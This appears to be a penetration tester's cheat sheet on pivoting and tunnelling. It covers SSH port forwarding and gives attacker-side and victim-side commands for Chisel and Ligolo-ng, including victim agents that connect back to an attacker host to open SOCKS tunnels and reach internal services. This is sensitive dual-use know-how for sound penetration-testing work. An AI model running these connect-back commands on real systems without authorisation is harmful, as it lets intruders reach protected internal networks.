# AI - Pivoting & Tunneling

## 🧭 Scenario Selection
*Choose the right tool for the job.*

- [ ] **Access Internal Service** (e.g., MySQL on internal host) -> [[#Local Port Forwarding]]
- [ ] **Catch Reverse Shell** (e.g., Target connects back to you) -> [[#Remote Port Forwarding]]
- [ ] **Full Network Access** (VPN-like routing) -> [[#Ligolo-ng]] / [[#Dynamic Port Forwarding (SOCKS)]]

---

## 📊 Topology Diagrams

### Local Port Forwarding (SSH -L)
*Access a service blocked by a firewall but accessible by a pivot.*
```mermaid
graph LR
    Kali[Kali Local:1234] -- SSH Tunnel --> Pivot[Pivot Host]
    Pivot -- Forward --> Target[Target Service:3306]
    style Kali fill:#f9f,stroke:#333
    style Target fill:#bbf,stroke:#333
```

### Remote Port Forwarding (SSH -R)
*Catch a reverse shell on your Kali box through the pivot.*
```mermaid
graph RL
    Target[Target Shell] -- Connects --> Pivot[Pivot Listen:8080]
    Pivot -- SSH Tunnel --> Kali[Kali Listen:80]
    style Kali fill:#f9f,stroke:#333
    style Target fill:#bbf,stroke:#333
```

---

## SSH Tunneling

### Local Port Forwarding
*Access a remote service (e.g., MySQL on port 3306) locally on port 1234.*
```blade-bash tab="ops" pane="one"
ssh -L 1234:127.0.0.1:3306 $user@$ip
```

### Dynamic Port Forwarding (SOCKS)
*Create a SOCKS proxy on local port 9050.*
```blade-bash tab="ops" pane="one"
ssh -D 9050 $user@$ip
```

### Remote Port Forwarding
*Expose a local port (e.g., 80) to the remote server on port 8080.*
```blade-bash tab="ops" pane="one"
ssh -R 8080:127.0.0.1:80 $user@$ip
```

---

## Chisel

### Server (Attacker)
*Start Reverse Proxy Server on port 8000.*
```blade-bash tab="ops" pane="one"
./chisel server -p 8000 --reverse
```

### Client (Victim - Reverse)
*Connect back to attacker and forward a SOCKS proxy.*
```blade-bash tab="ops" pane="one"
./chisel client $attacker_ip:8000 R:socks
```

### Client (Victim - Port Forward)
*Forward remote 3306 to local 3306.*
```blade-bash tab="ops" pane="one"
./chisel client $attacker_ip:8000 R:3306:127.0.0.1:3306
```

---

## Ligolo-ng

### Setup (Attacker)
*1. Create Tun Interface*
```blade-bash tab="ops" pane="one"
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

*2. Start Proxy*
```blade-bash tab="ops" pane="one"
./proxy -selfcert
```

### Agent (Victim)
*Connect back to proxy.*
```blade-bash tab="ops" pane="one"
./agent -connect $attacker_ip:11601 -ignore-cert
```

### Routing (Attacker)
*After session is established, add route to internal subnet.*
```blade-bash tab="ops" pane="one"
sudo ip route add $internal_subnet/24 dev ligolo
```